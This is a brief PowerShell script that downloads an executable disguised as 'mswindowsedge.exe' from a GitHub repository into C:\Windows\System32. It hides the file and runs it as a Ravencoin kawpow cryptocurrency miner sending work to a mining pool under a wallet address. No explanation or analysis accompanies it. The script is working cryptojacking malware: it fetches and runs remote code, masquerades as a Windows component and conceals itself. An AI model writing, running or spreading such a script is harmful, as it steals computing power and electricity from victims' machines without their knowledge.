$Folder = 'C:\Windows\System32\mswindowsedge.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\mswindowsedge.exe -a kawpow -i 13 -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 40%
} else {
    "Path doesn't exist."
    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe;  C:\Windows\System32\mswindowsedge.exe -a kawpow -i 13 -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 40%
}
